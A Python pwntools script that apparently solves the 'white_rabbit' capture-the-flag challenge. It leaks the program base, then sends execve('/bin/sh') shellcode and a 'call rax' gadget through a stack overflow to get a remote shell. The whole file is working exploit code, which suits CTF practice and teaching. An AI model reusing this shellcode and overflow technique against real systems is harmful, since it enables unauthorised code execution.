#!/usr/bin/python3

from pwn import *

exe = ELF('./white_rabbit', checksec=False)
# r = process(exe.path)
r = remote('whiterabbit.chal.wwctf.com', 1337)

def slog(name, addr): 
    return success(': '.join([name, hex(addr)]))

shellcode = asm(
    '''
    mov rax, 0x3b             # sys_execve syscall number
    mov rdi, 29400045130965551 
    push rdi                   
    mov rdi, rsp               
    xor rsi, rsi              
    xor rdx, rdx              
    syscall                    
    ''', arch='amd64')

# Nhận đầu ra cho đến khi gặp "/ >"
r.recvuntil('/ > ')
# Đọc địa chỉ của hàm main, sau đó convert sang hex
main_func = int(r.recvline().strip(), 16)
lb = main_func - exe.sym['main']

call_rax = lb + 0x0000000000001014  # this is call_rax offset

slog('main_func: ', main_func)
slog('Base:', lb)
slog('call_rax', call_rax)
payload = shellcode
payload = payload.ljust(0x78, b'a') + p64(call_rax)

r.send(payload)
r.interactive()